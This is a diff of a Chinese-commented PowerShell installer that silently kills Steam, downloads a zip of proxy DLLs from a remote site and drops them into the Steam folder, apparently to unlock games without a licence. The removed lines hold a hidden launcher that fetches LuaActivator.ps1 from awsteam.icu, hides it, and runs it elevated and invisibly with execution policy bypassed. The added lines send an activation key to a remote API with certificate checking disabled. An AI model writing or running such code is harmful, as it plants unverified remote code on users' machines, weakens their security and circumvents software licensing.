@@ -2,26 +2,23 @@
 $ProgressPreference = 'SilentlyContinue'
 $ErrorActionPreference = 'SilentlyContinue'
 
-# ========== 配置区 ==========
+# 配置区，无需改动
 $ZipUrl = "https://aiwandianwan-maker.github.io/steamrun/patch.zip"
 $TempZip = "$env:TEMP\steam_patch.zip"
 $TempUnzip = "$env:TEMP\steam_patch_temp"
 $CopyList = @("config","dwmapi.dll","OpenSteamTool.dll","xinput1_4.dll","steam.cfg","opensteamtool.toml")
-# 激活工具配置
-$ActivatorPs1Url = "https://awsteam.icu/LuaActivator.ps1"
-$DesktopPath = [Environment]::GetFolderPath("Desktop")
-$LocalPs1 = Join-Path $DesktopPath "LuaActivator.ps1"
-$LocalBat = Join-Path $DesktopPath "steam激活程序.bat"
-# ============================
+$ApiUrl = "https://api.awsteam.icu/api.php"
 
 # 自动查找Steam路径
 $SteamRoot = $null
+# 读取用户注册表
 if(Test-Path "HKCU:\Software\Valve\Steam"){
     $regInfo = Get-ItemProperty "HKCU:\Software\Valve\Steam"
     if($regInfo.SteamPath -and (Test-Path "$($regInfo.SteamPath)\steam.exe")){
         $SteamRoot = $regInfo.SteamPath.TrimEnd('\')
     }
 }
+# 读取系统注册表
 if(-not $SteamRoot){
     if(Test-Path "HKLM:\SOFTWARE\Wow6432Node\Valve\Steam"){
         $regInfo = Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Valve\Steam"
@@ -30,30 +27,39 @@ if(-not $SteamRoot){
         }
     }
 }
+# 扫描C/D/E/F盘Steam目录
 if(-not $SteamRoot){
     $diskArr = @("C:","D:","E:","F:")
     foreach($disk in $diskArr){
         $path1 = "$disk\Program Files (x86)\Steam"
-        if(Test-Path "$path1\steam.exe"){ $SteamRoot = $path1; break }
+        if(Test-Path "$path1\steam.exe"){
+            $SteamRoot = $path1
+            break
+        }
         $path2 = "$disk\Steam"
-        if(Test-Path "$path2\steam.exe"){ $SteamRoot = $path2; break }
+        if(Test-Path "$path2\steam.exe"){
+            $SteamRoot = $path2
+            break
+        }
     }
 }
+# 从运行中的Steam进程识别
 if(-not $SteamRoot){
-    $steamProc = Get-Process steam -ErrorAction SilentlyContinue
+    $steamProc = Get-Process steam
     if($steamProc){
         $exePath = $steamProc[0].Path
         $SteamRoot = Split-Path $exePath -Parent
     }
 }
+# 未找到Steam，5秒后自动退出
 if(-not $SteamRoot -or -not (Test-Path "$SteamRoot\steam.exe")){
     Write-Host "`n❌ ERROR: Cannot locate Steam folder" -ForegroundColor Red
-    Read-Host "Press Enter to close"
+    Start-Sleep 5
     exit 1
 }
 
 # 静默关闭所有Steam进程
-Get-Process steam,steamwebhelper,steamerrorreporter -ErrorAction SilentlyContinue | Stop-Process -Force
+Get-Process steam,steamwebhelper,steamerrorreporter | Stop-Process -Force
 Start-Sleep -Seconds 2
 
 # 静默下载补丁包
@@ -62,7 +68,7 @@ try{
     $webClient.DownloadFile($ZipUrl,$TempZip)
 }catch{
     Write-Host "`n❌ ERROR: Patch download failed" -ForegroundColor Red
-    Read-Host "Press Enter to close"
+    Start-Sleep 5
     exit 1
 }
 
@@ -94,54 +100,7 @@ if(Test-Path $cfgFullPath){
 Remove-Item $TempZip -Force
 Remove-Item $TempUnzip -Recurse -Force
 
-# ========== 桌面释放 steam激活程序.bat（强制覆盖+双重容错） ==========
-try{
-    # 1. 强制删除旧文件，无论是否存在，彻底避免旧文件干扰
-    if(Test-Path $LocalPs1){ Remove-Item $LocalPs1 -Force -ErrorAction SilentlyContinue }
-    if(Test-Path $LocalBat){ Remove-Item $LocalBat -Force -ErrorAction SilentlyContinue }
-
-    # 2. 重新下载最新版ps1核心文件
-    $webClient.DownloadFile($ActivatorPs1Url, $LocalPs1)
-
-    # 3. 设置ps1文件为隐藏属性
-    if(Test-Path $LocalPs1){
-        $file = Get-Item $LocalPs1 -Force
-        $file.Attributes += [System.IO.FileAttributes]::Hidden
-    }
-
-    # 4. 生成BAT启动器（带启动失败自动修复，纯英文无乱码）
-$batContent = @"
-@echo off
-title Steam Activator
-if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
-
-:: 第一次尝试启动
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0LuaActivator.ps1"
-
-:: 如果启动失败，自动修复后重试
-if %errorlevel% neq 0 (
-    :: 强制删除损坏文件，重新下载
-    if exist "%~dp0LuaActivator.ps1" del /f /a "%~dp0LuaActivator.ps1"
-    powershell -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('https://awsteam.icu/LuaActivator.ps1','%~dp0LuaActivator.ps1')"
-    attrib +h "%~dp0LuaActivator.ps1"
-    :: 修复完成后重新启动
-    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0LuaActivator.ps1"
-)
-
-exit
-"@
-    [System.IO.File]::WriteAllText($LocalBat, $batContent, [System.Text.Encoding]::Default)
-
-    # 5. 自动启动激活工具
-    if(Test-Path $LocalBat){
-        Start-Process $LocalBat -Verb RunAs
-    }
-}catch{
-    # 释放失败不影响主补丁流程
-}
-# ======================================================
-
-# 输出最终结果
+# 输出安装结果
 Write-Host "`n=====================================" -ForegroundColor Cyan
 if($installComplete){
     Write-Host "✅ SUCCESS: All patches installed" -ForegroundColor Green
@@ -150,9 +109,45 @@ if($installComplete){
 }
 Write-Host "=====================================`n" -ForegroundColor Cyan
 
-# 启动Steam
+# ========== 修复：激活码验证弹窗，强制关闭静默错误 ==========
+# 临时恢复错误提示，确保弹窗和网络请求不会被静默跳过
+$ErrorActionPreference = 'Continue'
+try {
+    Add-Type -AssemblyName Microsoft.VisualBasic -ErrorAction Stop
+    $inputKey = [Microsoft.VisualBasic.Interaction]::InputBox("请输入激活码完成授权绑定", "激活码验证", "")
+    
+    if (-not [string]::IsNullOrWhiteSpace($inputKey)) {
+        # TLS兼容配置
+        try {
+            $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
+            [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
+        } catch {
+            [System.Net.ServicePointManager]::SecurityProtocol = 3072
+        }
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+        $postBody = @{ key = $inputKey.Trim() }
+        $response = Invoke-RestMethod -Uri $ApiUrl -Method Post -Body $postBody -ErrorAction Stop
+        
+        if ($response.code -eq 1) {
+            $gameName = $response.data.game_name
+            $luaFile = $response.data.lua_filename
+            [Microsoft.VisualBasic.Interaction]::MsgBox("激活成功！`n对应游戏：$gameName`n补丁文件：$luaFile`n授权已生效。", "OKOnly", "激活成功")
+        } else {
+            [Microsoft.VisualBasic.Interaction]::MsgBox("激活失败：`n$($response.msg)", "OKOnly", "激活失败")
+        }
+    }
+} catch {
+    # 兜底：弹窗加载失败不中断脚本，不影响补丁使用
+    Write-Host "激活验证模块加载异常，跳过验证。" -ForegroundColor Yellow
+}
+# 恢复静默配置
+$ErrorActionPreference = 'SilentlyContinue'
+
+# 启动Steam，5秒后自动关闭窗口
 Start-Sleep -Seconds 2
 Start-Process "$SteamRoot\steam.exe"
 
-Read-Host "Press Enter to close window"
+Write-Host "`n窗口将在5秒后自动关闭..." -ForegroundColor Gray
+Start-Sleep -Seconds 5
 exit 0
